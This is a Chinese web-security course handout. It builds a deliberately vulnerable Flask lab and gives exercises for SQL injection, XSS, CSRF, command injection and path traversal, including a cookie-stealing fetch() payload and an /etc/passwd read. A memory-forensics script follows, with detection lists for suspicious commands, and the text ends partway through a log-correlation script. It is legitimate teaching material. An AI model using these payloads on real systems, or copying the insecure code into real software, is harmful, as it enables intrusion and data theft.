web安全

第一节课
HTTP协议基础
HTTP请求结构

GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: sessionid=abc123
方法：GET、POST、PUT、DELETE等
路径：请求的资源
版本：HTTP/1.1 或 HTTP/2
头部：键值对，传递额外信息（Host、User-Agent、Cookie等）
空行后是消息体（POST请求时携带数据）
HTTP响应结构

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 123
Set-Cookie: sessionid=xyz789

<html>...</html>
状态行：版本、状态码、状态描述
头部：服务器信息、内容类型、Cookie设置等
空行后是消息体（网页内容）
常见状态码
2xx：成功（200 OK）
3xx：重定向（302 Found）
4xx：客户端错误（404 Not Found）
5xx：服务器错误（500 Internal Server Error）
会话管理
HTTP无状态，需通过Cookie或Session维持用户状态。
Cookie由服务器通过Set-Cookie头部发送，浏览器后续请求自动携带。

搭建Python环境与漏洞演示应用
环境要求
Python 3.7+
pip
virtualenv（可选）
安装依赖

pip install flask requests
漏洞演示应用（Flask）
我们将创建一个简单的Flask应用，包含一个搜索功能（存在SQL注入）和一个反射型XSS页面。
app.py

from flask import Flask, request, render_template_string
import sqlite3

app = Flask(__name__)

# 初始化数据库
def init_db():
    conn = sqlite3.connect('test.db')
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
    c.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 'admin123')")
    c.execute("INSERT OR IGNORE INTO users VALUES (2, 'guest', 'guestpass')")
    conn.commit()
    conn.close()

init_db()

# 首页
@app.route('/')
def index():
    return '''
    <h1>漏洞演示应用</h1>
    <ul>
        <li><a href="/search?q=test">搜索（SQL注入漏洞）</a></li>
        <li><a href="/xss?name=World">XSS演示</a></li>
    </ul>
    '''

# 搜索功能（存在SQL注入）
@app.route('/search')
def search():
    q = request.args.get('q', '')
    conn = sqlite3.connect('test.db')
    c = conn.cursor()
    # 漏洞：直接拼接字符串
    query = f"SELECT username, password FROM users WHERE username LIKE '%{q}%'"
    try:
        c.execute(query)
        results = c.fetchall()
    except Exception as e:
        return f"SQL错误: {e}"
    conn.close()
    return render_template_string('''
        <h2>搜索结果</h2>
        <p>查询: {{ q }}</p>
        <ul>
        {% for row in results %}
            <li>{{ row[0] }} - {{ row[1] }}</li>
        {% else %}
            <li>无结果</li>
        {% endfor %}
        </ul>
        <a href="/">返回</a>
    ''', q=q, results=results)

# 反射型XSS
@app.route('/xss')
def xss():
    name = request.args.get('name', '')
    # 漏洞：直接渲染用户输入
    return render_template_string('''
        <h2>Hello, {{ name|safe }}!</h2>
        <p>这是一个反射型XSS演示。</p>
        <a href="/">返回</a>
    ''', name=name)

if __name__ == '__main__':
    app.run(debug=True)
运行应用

python app.py
访问 http://127.0.0.1:5000/ 即可看到界面。

代码训练1：HTTP请求基础
目标：使用Python的requests库发送HTTP请求，观察响应结构，理解HTTP交互。
任务：
向首页发送GET请求，打印状态码、响应头和响应体。
向/search?q=test发送GET请求，观察返回内容。
分析Cookie的传递（如果需要可先访问首页获取Cookie）。
脚本示例（http_basics.py）

import requests

# 1. 访问首页
url = "http://127.0.0.1:5000/"
response = requests.get(url)
print("状态码:", response.status_code)
print("响应头:")
for key, value in response.headers.items():
    print(f"  {key}: {value}")
print("响应体预览:", response.text[:200])

# 2. 访问搜索页面
search_url = "http://127.0.0.1:5000/search"
params = {'q': 'test'}
response = requests.get(search_url, params=params)
print("\n搜索页面状态码:", response.status_code)
print("搜索页面内容:", response.text)

# 3. 查看Cookie（如果有）
print("Cookies:", response.cookies.get_dict())
代码训练2：模拟SQL注入攻击
目标：利用漏洞应用的搜索功能，通过Python脚本构造恶意输入，获取数据库中的所有用户信息。
原理：搜索功能直接拼接用户输入到SQL查询中，我们可以注入' OR '1'='1等payload，使查询返回所有记录。
任务：编写脚本实现以下操作：
获取所有用户（使用恒真条件）。
尝试联合查询获取更多信息（如数据库版本）。
脚本示例（sql_injection.py）

import requests

url = "http://127.0.0.1:5000/search"

# 1. 恒真注入，获取所有用户
payload = "' OR '1'='1"
params = {'q': payload}
response = requests.get(url, params=params)
print("注入结果:")
# 简单提取用户名密码（实际应解析HTML，这里直接打印）
print(response.text)

# 2. 联合查询获取数据库版本（SQLite）
payload2 = "' UNION SELECT sqlite_version(), '2' -- "
params = {'q': payload2}
response = requests.get(url, params=params)
print("\n联合查询结果（数据库版本）:")
print(response.text)
注意：实际利用时可能需要调整payload语法，因为SQLite的联合查询要求前后列数一致，这里假设原查询有两列（username, password）。
讨论：为什么' OR '1'='1能返回所有记录？如何防范？

代码训练3：模拟反射型XSS攻击
目标：利用XSS漏洞，通过Python脚本发送恶意链接，使受害者浏览器执行JavaScript。
原理：应用将用户输入直接嵌入HTML页面，未经过滤，导致可以注入脚本。
任务：
构造包含<script>alert('XSS')</script>的请求，观察浏览器弹窗。
尝试窃取Cookie（模拟攻击者服务器接收数据）。
脚本示例（xss_attack.py）

import requests
import urllib.parse

url = "http://127.0.0.1:5000/xss"
# 1. 简单的弹窗payload
payload = "<script>alert('XSS')</script>"
params = {'name': payload}
response = requests.get(url, params=params)
print("XSS响应（包含payload）:")
print(response.text)  # 直接查看响应，可以看到payload被插入

# 2. 尝试窃取Cookie（模拟）：
# 实际攻击中，会向攻击者服务器发送Cookie
# 这里仅构造一个向本地监听的服务器发送请求的payload
steal_payload = "<script>fetch('http://127.0.0.1:8000/steal?cookie='+document.cookie)</script>"
params2 = {'name': steal_payload}
print("\n窃取Cookie的payload:", urllib.parse.unquote(steal_payload))
print("请在浏览器中访问以下URL（或使用requests但不会执行JS）:")
print(f"{url}?name={urllib.parse.quote(steal_payload)}")
注意：Python的requests库不会执行JavaScript，所以我们需要手动在浏览器中打开构造的URL才能看到弹窗或请求发送。可以让学生手动测试。
扩展：可以用Python启动一个简单的HTTP服务器监听8000端口，看能否接收到请求（需要学生动手）。
安装Python和依赖：
保存app.py并运行：
打开浏览器访问 http://127.0.0.1:5000/ 确认应用运行。
依次运行三个训练脚本，观察输出。



练习4：基于表单的登录SQL注入
目标：利用SQL注入漏洞绕过登录验证，获取管理员权限。
漏洞位置：/login页面（GET显示表单，POST处理登录）。
原理：后端直接拼接用户名和密码到SQL查询，未使用参数化查询。
任务：
访问登录页面，观察表单结构（用户名、密码字段）。
编写Python脚本，尝试使用万能密码（如 ' OR '1'='1）登录。
思考：如何防范此类漏洞？
代码框架（login_sqli.py）

import requests

url = "http://127.0.0.1:5000/login"
# 构造payload：用户名输入恒真条件，密码随意
data = {
    'username': "' OR '1'='1' -- ",
    'password': 'anything'
}
response = requests.post(url, data=data)
print("登录响应：")
print(response.text)  # 如果返回"登录成功"或显示管理界面，则绕过成功
预期结果：成功登录（页面返回欢迎信息或跳转）。
讨论：为什么' OR '1'='1' --能绕过？--在SQL中表示注释，可截断后续密码检查。

练习5：存储型XSS攻击
目标：在留言板中注入恶意脚本，每次访问留言板都会触发。
漏洞位置：/comment页面（GET显示所有留言，POST提交新留言）。
原理：留言内容直接存入数据库，并在显示时未经过滤，导致脚本被浏览器执行。
任务：
编写脚本提交一条包含<script>alert('XSS')</script>的留言。
访问留言板页面，观察弹窗。
尝试窃取Cookie：将脚本改为向攻击者服务器发送Cookie（需配合简单HTTP服务器）。
代码框架（stored_xss.py）

import requests

# 提交恶意留言
post_url = "http://127.0.0.1:5000/comment"
payload = "<script>alert('Stored XSS')</script>"
data = {'content': payload}
response = requests.post(post_url, data=data)
print("提交结果：", response.status_code)

# 访问留言板查看效果（需手动在浏览器中打开）
get_url = "http://127.0.0.1:5000/comment"
print(f"请在浏览器中访问 {get_url} 查看弹窗。")
扩展：启动一个简单的HTTP服务器（python -m http.server 8000），然后构造窃取Cookie的payload：

<script>fetch('http://127.0.0.1:8000/steal?cookie='+document.cookie)</script>
练习6：CSRF攻击模拟
目标：利用CSRF漏洞，在用户不知情的情况下修改密码。
漏洞位置：/change_password页面（GET显示表单，POST处理密码修改，仅依赖Cookie验证身份）。
原理：修改密码接口只检查Cookie，未使用CSRF Token，导致攻击者可以诱导用户访问恶意页面，自动提交表单。
任务：
分析正常修改密码的请求（使用浏览器开发者工具观察）。
构造一个恶意HTML页面，当受害者访问时自动向/change_password发送POST请求，修改密码。
启动本地HTTP服务器提供恶意页面，并用自己的浏览器访问测试。
代码框架（csrf_attack.html，需通过HTTP服务器访问）

<html>
  <body>
    <h1>点击下方链接，触发CSRF攻击</h1>
    <!-- 自动提交表单（可配合图片触发） -->
    <img src="x" onerror="document.forms[0].submit()" style="display:none;">
    <form id="attack" method="POST" action="http://127.0.0.1:5000/change_password">
      <input type="hidden" name="new_password" value="hacked">
    </form>
    <script>document.getElementById('attack').submit();</script>
  </body>
</html>
测试步骤：
在漏洞应用中登录任意用户（如访问/login登录）。
在另一个终端启动HTTP服务器：python -m http.server 8080，并将上述HTML保存为csrf.html放入当前目录。
访问 http://127.0.0.1:8080/csrf.html，观察密码是否被修改。
讨论：如何防御？使用CSRF Token、SameSite Cookie属性等。

练习7：命令注入攻击
目标：通过命令注入漏洞执行任意系统命令。
漏洞位置：/ping页面（接受ip参数，执行系统ping命令）。
原理：后端直接拼接用户输入到命令字符串，未做过滤，导致可通过;、&&等执行额外命令。
任务：
正常访问/ping?ip=127.0.0.1，观察ping结果。
构造恶意输入，如127.0.0.1; ls，查看是否执行了ls命令。
尝试读取敏感文件（如Linux的/etc/passwd）。
代码框架（command_injection.py）

import requests
import urllib.parse

url = "http://127.0.0.1:5000/ping"
# 注入ls命令
payload = "127.0.0.1; ls"
params = {'ip': payload}
response = requests.get(url, params=params)
print("命令执行结果：")
print(response.text)
注意：不同操作系统命令不同，Windows下可用dir。
安全提示：本练习在虚拟机或隔离环境中进行，切勿用于真实系统。

练习8：目录遍历漏洞
目标：利用路径遍历漏洞读取服务器上的任意文件。
漏洞位置：/file页面（接受name参数，读取指定文件并显示内容）。
原理：后端直接拼接文件名到基础目录，未检查../等相对路径，导致可越权读取系统文件。
任务：
正常读取notes.txt（如/file?name=notes.txt）。
尝试读取/etc/passwd（Linux）或C:\Windows\win.ini（Windows）。
读取当前应用的源代码app.py。
代码框架（path_traversal.py）

import requests

url = "http://127.0.0.1:5000/file"
# 读取/etc/passwd
params = {'name': '../../../../etc/passwd'}  # 根据操作系统调整路径层级
response = requests.get(url, params=params)
print("文件内容：")
print(response.text)
预期：如果漏洞存在，会显示系统文件内容。
讨论：如何防御？对文件名进行白名单验证，或使用安全函数限制路径。

附录：扩展后的Flask漏洞应用完整代码
将以下代码保存为app.py，运行后即可使用所有练习

from flask import Flask, request, render_template_string, redirect, url_for
import sqlite3
import subprocess
import os

app = Flask(__name__)

# ---------- 数据库初始化 ----------
def init_db():
    conn = sqlite3.connect('test.db')
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
    c.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 'admin123')")
    c.execute("INSERT OR IGNORE INTO users VALUES (2, 'guest', 'guestpass')")
    c.execute('CREATE TABLE IF NOT EXISTS comments (id INTEGER PRIMARY KEY, content TEXT)')
    c.execute("INSERT OR IGNORE INTO comments VALUES (1, '第一条留言')")
    conn.commit()
    conn.close()

init_db()

# ---------- 首页 ----------
@app.route('/')
def index():
    return '''
    <h1>漏洞演示应用 - 扩展版</h1>
    <ul>
        <li><a href="/search?q=test">搜索（SQL注入）</a></li>
        <li><a href="/xss?name=World">反射型XSS</a></li>
        <li><a href="/login">登录（SQL注入）</a></li>
        <li><a href="/comment">留言板（存储型XSS）</a></li>
        <li><a href="/change_password">修改密码（CSRF）</a></li>
        <li><a href="/ping?ip=127.0.0.1">Ping（命令注入）</a></li>
        <li><a href="/file?name=notes.txt">读取文件（目录遍历）</a></li>
    </ul>
    '''

# ---------- 练习4：登录SQL注入 ----------
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        conn = sqlite3.connect('test.db')
        c = conn.cursor()
        # 漏洞：直接拼接
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        try:
            c.execute(query)
            user = c.fetchone()
        except Exception as e:
            return f"SQL错误: {e}"
        conn.close()
        if user:
            return f"登录成功！欢迎 {user[1]}"
        else:
            return "登录失败"
    return '''
        <h2>登录</h2>
        <form method="post">
            用户名: <input type="text" name="username"><br>
            密码: <input type="password" name="password"><br>
            <input type="submit" value="登录">
        </form>
    '''

# ---------- 练习5：存储型XSS ----------
@app.route('/comment', methods=['GET', 'POST'])
def comment():
    if request.method == 'POST':
        content = request.form.get('content', '')
        conn = sqlite3.connect('test.db')
        c = conn.cursor()
        # 漏洞：直接存储未过滤
        c.execute(f"INSERT INTO comments (content) VALUES ('{content}')")
        conn.commit()
        conn.close()
        return redirect(url_for('comment'))
    else:
        conn = sqlite3.connect('test.db')
        c = conn.cursor()
        c.execute("SELECT content FROM comments")
        comments = c.fetchall()
        conn.close()
        # 漏洞：直接渲染未转义
        html = '<h2>留言板</h2><form method="post"><input type="text" name="content"><input type="submit" value="留言"></form><ul>'
        for row in comments:
            html += f'<li>{row[0]}</li>'
        html += '</ul><a href="/">返回</a>'
        return render_template_string(html)

# ---------- 练习6：CSRF ----------
@app.route('/change_password', methods=['GET', 'POST'])
def change_password():
    # 模拟登录检查（仅检查Cookie，实际应为session）
    if request.method == 'POST':
        new_pass = request.form.get('new_password', '')
        # 假设修改成功
        return f"密码已修改为: {new_pass}"
    return '''
        <h2>修改密码</h2>
        <form method="post">
            新密码: <input type="password" name="new_password">
            <input type="submit" value="修改">
        </form>
    '''

# ---------- 练习7：命令注入 ----------
@app.route('/ping')
def ping():
    ip = request.args.get('ip', '')
    if not ip:
        return "请提供ip参数"
    # 漏洞：直接拼接命令
    command = f"ping -c 4 {ip}"  # Linux; Windows需改为 "ping -n 4"
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=5)
        return f"<pre>{output.decode('utf-8', errors='ignore')}</pre>"
    except subprocess.TimeoutExpired:
        return "命令执行超时"
    except Exception as e:
        return f"错误: {e}"

# ---------- 练习8：目录遍历 ----------
@app.route('/file')
def read_file():
    name = request.args.get('name', '')
    base_dir = './files/'  # 假设文件存储在此目录下
    # 漏洞：直接拼接路径，未过滤..
    try:
        with open(os.path.join(base_dir, name), 'r') as f:
            content = f.read()
        return f"<pre>{content}</pre>"
    except Exception as e:
        return f"文件读取失败: {e}"

# ---------- 原有功能 ----------
@app.route('/search')
def search():
    q = request.args.get('q', '')
    conn = sqlite3.connect('test.db')
    c = conn.cursor()
    query = f"SELECT username, password FROM users WHERE username LIKE '%{q}%'"
    try:
        c.execute(query)
        results = c.fetchall()
    except Exception as e:
        return f"SQL错误: {e}"
    conn.close()
    return render_template_string('''
        <h2>搜索结果</h2>
        <p>查询: {{ q }}</p>
        <ul>
        {% for row in results %}
            <li>{{ row[0] }} - {{ row[1] }}</li>
        {% else %}
            <li>无结果</li>
        {% endfor %}
        </ul>
        <a href="/">返回</a>
    ''', q=q, results=results)

@app.route('/xss')
def xss():
    name = request.args.get('name', '')
    return render_template_string('''
        <h2>Hello, {{ name|safe }}!</h2>
        <p>这是一个反射型XSS演示。</p>
        <a href="/">返回</a>
    ''', name=name)

if __name__ == '__main__':
    # 创建文件读取的基础目录
    os.makedirs('./files', exist_ok=True)
    with open('./files/notes.txt', 'w') as f:
        f.write('这是测试文件 notes.txt\n可以尝试读取其他文件。')
    app.run(debug=True)
注意事项：
命令注入练习在Windows下需将命令改为ping -n 4，否则会报错。可在代码中根据平台动态调整，或统一使用ping -c 4（Linux/macOS）。
目录遍历练习默认在./files目录下操作，创建了notes.txt作为示例。学生通过../可读取系统文件，请确保在安全环境中进行。
运行应用后，所有练习均可通过浏览器访问相应路由进行测试。
第二节课
深度取证与云环境响应
内存分析、云安全、勒索软件
课程目标
掌握内存取证技术，提取攻击痕迹
实现多源日志关联分析
模拟勒索软件并编写解密工具
使用云API自动化响应
基于YARA的威胁狩猎
动态行为分析沙箱
构建简单SOAR工作流

# 创建虚拟环境
python -m venv ir_env
source ir_env/bin/activate  # Linux/Mac
# ir_env\Scripts\activate   # Windows

# 安装核心依赖
pip install volatility3 yara-python boto3 requests pandas numpy cryptography psutil matplotlib networkx docker

# 验证安装
python -c "import volatility3; print('Volatility3 OK')"
python -c "import yara; print('YARA OK')"
什么是内存取证？
从系统内存（RAM）中提取证据的技术
可以获取：运行进程、网络连接、加密密钥、隐藏代码
常见应用场景：
无文件攻击检测
进程注入分析
加密密钥提取
rootkit检测
Volatility3简介：
开源内存取证框架
支持Windows/Linux/macOS
插件化架构
代码练习：内存分析器

#!/usr/bin/env python3
"""
内存取证分析器 - 完整版
功能：解析内存镜像，检测隐藏进程、代码注入、网络连接
"""

import os
import sys
import json
import subprocess
import re
from datetime import datetime

class MemoryAnalyzer:
    """内存取证分析器"""
    
    def __init__(self, image_path, volatility_path='vol'):
        """
        初始化分析器
        :param image_path: 内存镜像路径
        :param volatility_path: volatility3命令路径
        """
        self.image_path = image_path
        self.volatility = volatility_path
        self.output_dir = f"memory_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.results = {
            'image': image_path,
            'analysis_time': datetime.now().isoformat(),
            'processes': [],
            'connections': [],
            'injections': [],
            'malfind_results': [],
            'cmdline': []
        }
        
        # 创建输出目录
        os.makedirs(self.output_dir, exist_ok=True)
    
    def run_volatility(self, plugin, args=''):
        """
        执行volatility命令
        """
        cmd = f"{self.volatility} -f {self.image_path} {plugin} {args}"
        print(f"[*] 执行: {cmd}")
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            if result.returncode != 0:
                print(f"[-] 命令失败: {result.stderr}")
                return None
            return result.stdout
        except subprocess.TimeoutExpired:
            print("[-] 命令执行超时")
            return None
        except Exception as e:
            print(f"[-] 执行异常: {e}")
            return None
    
    def get_processes(self):
        """
        获取进程列表 (windows.pstree)
        """
        print("\n[*] 获取进程列表...")
        output = self.run_volatility("windows.pstree.PsTree")
        
        if not output:
            return
        
        # 保存原始输出
        with open(f"{self.output_dir}/pstree.txt", 'w') as f:
            f.write(output)
        
        # 解析进程信息
        processes = []
        lines = output.split('\n')
        
        for line in lines:
            # 匹配进程行: 偏移量 进程名 PID PPID ...
            match = re.search(r'([0-9a-fx]+)\s+(\S+\.exe)\s+(\d+)\s+(\d+)', line, re.I)
            if match:
                proc = {
                    'offset': match.group(1),
                    'name': match.group(2),
                    'pid': int(match.group(3)),
                    'ppid': int(match.group(4))
                }
                processes.append(proc)
                
                # 检测可疑进程名
                suspicious_names = ['cmd.exe', 'powershell.exe', 'wscript.exe', 
                                   'cscript.exe', 'mshta.exe', 'regsvr32.exe']
                if proc['name'].lower() in suspicious_names:
                    print(f"  [!] 可疑进程: {proc['name']} (PID: {proc['pid']})")
        
        self.results['processes'] = processes
        print(f"[+] 发现 {len(processes)} 个进程")
        return processes
    
    def get_connections(self):
        """
        获取网络连接 (windows.netscan)
        """
        print("\n[*] 获取网络连接...")
        output = self.run_volatility("windows.netscan.NetScan")
        
        if not output:
            return
        
        with open(f"{self.output_dir}/netscan.txt", 'w') as f:
            f.write(output)
        
        connections = []
        lines = output.split('\n')
        
        for line in lines:
            # 匹配TCP/UDP连接
            if 'TCP' in line or 'UDP' in line:
                parts = line.split()
                if len(parts) >= 6:
                    conn = {
                        'offset': parts[0],
                        'proto': parts[1],
                        'local_addr': parts[2],
                        'remote_addr': parts[3],
                        'state': parts[4] if len(parts) > 4 else '',
                        'pid': parts[5] if len(parts) > 5 else ''
                    }
                    connections.append(conn)
                    
                    # 检测可疑外部连接
                    if conn['remote_addr'] != '-':
                        ip_port = conn['remote_addr'].split(':')
                        if len(ip_port) == 2:
                            ip = ip_port[0]
                            # 检查是否为私有IP
                            if not ip.startswith(('10.', '192.168.', '172.16.', '127.')):
                                print(f"  [!] 外部连接: {conn['proto']} {conn['local_addr']} -> {conn['remote_addr']}")
        
        self.results['connections'] = connections
        print(f"[+] 发现 {len(connections)} 个网络连接")
        return connections
    
    def detect_injection(self):
        """
        检测代码注入 (windows.malfind)
        """
        print("\n[*] 检测代码注入...")
        output = self.run_volatility("windows.malfind.Malfind")
        
        if not output:
            return
        
        with open(f"{self.output_dir}/malfind.txt", 'w') as f:
            f.write(output)
        
        injections = []
        lines = output.split('\n')
        
        for i, line in enumerate(lines):
            # 查找包含MZ或PE头的行（表示可执行代码）
            if 'MZ' in line or 'PE' in line:
                # 向上查找进程信息
                for j in range(max(0, i-5), i):
                    proc_match = re.search(r'Process\s+(\S+)\s+PID:\s+(\d+)', lines[j])
                    if proc_match:
                        injection = {
                            'process': proc_match.group(1),
                            'pid': int(proc_match.group(2)),
                            'address': line.split()[0] if line.split() else '',
                            'indicator': 'MZ' if 'MZ' in line else 'PE'
                        }
                        injections.append(injection)
                        print(f"  [!] 发现注入: {injection['process']} (PID: {injection['pid']}) at {injection['address']}")
                        break
        
        self.results['injections'] = injections
        print(f"[+] 发现 {len(injections)} 个注入痕迹")
        return injections
    
    def get_cmdline(self):
        """
        获取命令行参数 (windows.cmdline)
        """
        print("\n[*] 获取进程命令行...")
        output = self.run_volatility("windows.cmdline.CmdLine")
        
        if not output:
            return
        
        with open(f"{self.output_dir}/cmdline.txt", 'w') as f:
            f.write(output)
        
        cmdlines = []
        lines = output.split('\n')
        
        for line in lines:
            match = re.search(r'(\S+\.exe)\s+pid:\s+(\d+)\s+(.*)', line, re.I)
            if match:
                cmd = {
                    'process': match.group(1),
                    'pid': int(match.group(2)),
                    'cmdline': match.group(3)
                }
                cmdlines.append(cmd)
                
                # 检测可疑命令行
                suspicious_args = ['-enc', '-e ', 'hidden', 'bypass', 'downloadstring',
                                  'invoke-expression', 'wget', 'curl']
                for arg in suspicious_args:
                    if arg in cmd['cmdline'].lower():
                        print(f"  [!] 可疑命令行: {cmd['process']} {cmd['cmdline'][:100]}")
                        break
        
        self.results['cmdline'] = cmdlines
        print(f"[+] 获取 {len(cmdlines)} 个命令行")
        return cmdlines
    
    def dump_process(self, pid):
        """
        转储指定进程的内存
        """
        print(f"\n[*] 转储进程 PID: {pid}")
        output = self.run_volatility(f"windows.memmap.Memmap --pid {pid} --dump")
        
        if output:
            print(f"[+] 进程转储完成")
        return output
    
    def generate_report(self):
        """
        生成分析报告
        """
        report_path = f"{self.output_dir}/analysis_report.json"
        
        # 计算风险评分
        risk_score = 0
        risk_score += len(self.results['injections']) * 30
        risk_score += sum(1 for p in self.results['processes'] 
                         if p['name'].lower() in ['cmd.exe', 'powershell.exe']) * 10
        risk_score += len([c for c in self.results['connections'] 
                          if c['remote_addr'] != '-' and not c['remote_addr'].startswith('127.')]) * 5
        
        self.results['risk_score'] = min(risk_score, 100)
        self.results['risk_level'] = '高危' if risk_score > 70 else '中危' if risk_score > 30 else '低危'
        
        # 保存JSON报告
        with open(report_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        # 打印摘要报告
        print("\n" + "="*60)
        print("内存取证分析报告")
        print("="*60)
        print(f"镜像文件: {self.image_path}")
        print(f"分析时间: {self.results['analysis_time']}")
        print(f"风险等级: {self.results['risk_level']} (评分: {self.results['risk_score']})")
        print(f"\n进程总数: {len(self.results['processes'])}")
        print(f"网络连接: {len(self.results['connections'])}")
        print(f"注入检测: {len(self.results['injections'])}")
        print(f"命令行数: {len(self.results['cmdline'])}")
        print(f"\n报告保存: {report_path}")
        
        return self.results

def main():
    """主函数"""
    if len(sys.argv) < 2:
        print("用法: python memory_analyzer.py <内存镜像路径> [--dump PID]")
        sys.exit(1)
    
    image_path = sys.argv[1]
    
    # 创建分析器
    analyzer = MemoryAnalyzer(image_path)
    
    # 执行分析
    analyzer.get_processes()
    analyzer.get_connections()
    analyzer.detect_injection()
    analyzer.get_cmdline()
    
    # 如果指定了转储进程
    if len(sys.argv) == 4 and sys.argv[2] == '--dump':
        analyzer.dump_process(int(sys.argv[3]))
    
    # 生成报告
    analyzer.generate_report()

if __name__ == '__main__':
    main()
演练任务：
下载测试内存镜像：wget https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples
运行分析器：python memory_analyzer.py win7_memory.dmp
观察输出，识别可疑进程
尝试转储特定进程：python memory_analyzer.py win7_memory.dmp --dump 1234
日志深度挖掘
日志关联的重要性：
单一日志可能看不出攻击
多源日志可以还原完整攻击链
时间轴分析发现因果关系
常见日志类型：
Web访问日志
系统认证日志
防火墙日志
应用日志
数据库日志
关联技术：
时间窗口关联
源IP关联
会话ID关联
行为模式匹配
代码练习：日志关联分析器

#!/usr/bin/env python3
"""
日志关联分析器 - 完整版
功能：合并多种日志，按时间排序，识别攻击模式
"""

import os
import re
import glob
import json
import pandas as pd
from datetime import datetime, timedelta
from collections import defaultdict
import argparse

class LogCorrelator:
    """日志关联分析器"""
    
    def __init__(self, log_dir='./logs', time_window=5):
        """
        初始化
        :param log_dir: 日志目录
        :param time_window: 时间窗口（分钟）
        """
        self.log_dir = log_dir
        self.time_window = time_window
        self.events = []
        self.suspicious_ips = set()
        self.attack_patterns = []
        
    def parse_apache(self, file_pattern='access.log*'):
        """
        解析Apache访问日志
        格式: IP - - [时间] "方法 路径 协议" 状态码 大小
        """
        print(f"[*] 解析Apache日志: {file_pattern}")
        
        for fname in glob.glob(os.path.join(self.log_dir, file_pattern)):
            print(f"    读取: {fname}")
            with open(fname, 'r', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    try:
                        # 匹配Apache日志格式
                        pattern = r'(\d+\.\d+\.\d+\.\d+).*?\[(.*?)\].*?"(\w+)\s+(\S+)\s+HTTP.*?"\s+(\d+)\s+(\d+)'
                        match = re.search(pattern, line)
                        
                        if match:
                            ip, time_str, method, path, status, size = match.groups()
                            
                            # 解析时间: 10/Oct/2023:13:55:36 +0000
                            time_parts = time_str.split()
                            if time_parts:
                                dt = datetime.strptime(time_parts[0], "%d/%b/%Y:%H:%M:%S")
                                
                                event = {
                                    'timestamp': dt,
                                    'source_ip': ip,
                                    'type': 'web_access',
                                    'method': method,
                                    'path': path,
                                    'status': int(status),
                                    'size': int(size),
                                    'raw': line.strip(),
                                    'source_file': fname
                                }
                                self.events.append(event)
                                
                                # 检测可疑状态码
                                if int(status) >= 400:
                                    self.suspicious_ips.add(ip)
                    except Exception as e:
                        print(f"    解析错误 [{fname}:{line_num}]: {e}")
        
        print(f"    解析完成，获得 {len([e for e in self.events if e['type']=='web_access'])} 条记录")
    
    def parse_auth(self, file_pattern='auth.log*'):
        """
        解析系统认证日志
        """
        print(f"[*] 解析认证日志: {file_pattern}")
        
        for fname in glob.glob(os.path.join(self.log_dir, file_pattern)):
            print(f"    读取: {fname}")
            with open(fname, 'r', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    try:
                        # 匹配失败登录
                        if 'Failed password' in line:
                            pattern = r'(\w+\s+\d+\s+\d+:\d+:\d+).*?from (\d+\.\d+\.\d+\.\d+)'
                            match = re.search(pattern, line)
                            if match:
                                time_str, ip = match.groups()
                                # 添加年份（假设为当前年）
                                dt = datetime.strptime(f"{datetime.now().year} {time_str}", "%Y %b %d %H:%M:%S")
                                
                                event = {
                                    'timestamp': dt,
                                    'source_ip': ip,
                                    'type': 'auth_failure',
                                    'detail': line.strip(),
                                    'source_file': fname
                                }
                                self.events.append(event)
                                self.suspicious_ips.add(ip)
                        
                        # 匹配成功登录
                        elif 'Accepted password' in line:
                            pattern = r'(\w+\s+\d+\s+\d+:\d+:\d+).*?from (\d+\.\d+\.\d+\.\d+)'
                            match = re.search(pattern, line)
                            if match:
                                time_str, ip = match.groups()
                                dt = datetime.strptime(f"{datetime.now().year} {time_str}", "%Y %b %d %H:%M:%S")
                                
                                event = {
                                    'timestamp': dt,
                                    'source_ip': ip,
                                    'type': 'auth_success',
                                    'detail': line.strip(),
                                    'source_file': fname
                                }
                                self.events.append(event)
                    
                    except Exception as e:
                        print(f"    解析错误 [{fname}:{line_num}]: {e}")
        
        print(f"    解析完成，获得 {len([e for e in self.events if e['type'].startswith('auth')])} 条记录")
    
    def parse_firewall(self, file_pattern='firewall.log*'):
        """
        解析防火墙日志（模拟）
        """
        print(f"[*] 解析防火墙日志: {file_pattern}")
        
        for fname in glob.glob(os.path.join(self.log_dir, file_pattern)):
            print(f"    读取: {fname}")
            with open(fname, 'r', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    try:
                        # 模拟格式: 时间 动作 协议 源IP 目的IP 端口
                        parts = line.strip().split()
                        if len(parts) >= 6:
                            dt = datetime.strptime(parts[0], "%Y-%m-%d %H:%M:%S")
                            event = {
                                'timestamp': dt,
                                'source_ip': parts[3],
                                'dest_ip': parts[4],
                                'type': 'firewall_' + parts[1].lower(),
                                'protocol': parts[2],
                                'port': parts[5],
                                'raw': line.strip(),
                                'source_file': fname
                            }
                            self.events.append(event)
                    except:
                        pass
    
    def correlate(self):
        """
        执行关联分析
        """
        if not self.events:
            print("[-] 无事件可分析")
            return
        
        print("\n" + "="*60)
        print("日志关联分析")
        print("="*60)
        
        # 转换为DataFrame便于分析
        df = pd.DataFrame(self.events)
        df = df.sort_values('timestamp')
        
        # 保存排序后的事件
        df.to_csv('sorted_events.csv', index=False)
        print(f"[+] 事件已保存: sorted_events.csv ({len(df)} 条)")
        
        # 1. 统计每个IP的事件数
        print("\n[1] 可疑IP统计")
        ip_stats = df.groupby('source_ip').size().sort_values(ascending=False)
        for ip, count in ip_stats.head(10).items():
            print(f"  {ip}: {count} 次事件")
        
        # 2. 检测暴力破解
        print("\n[2] 暴力破解检测")
        for ip in ip_stats.index[:20]:  # 检查前20个IP
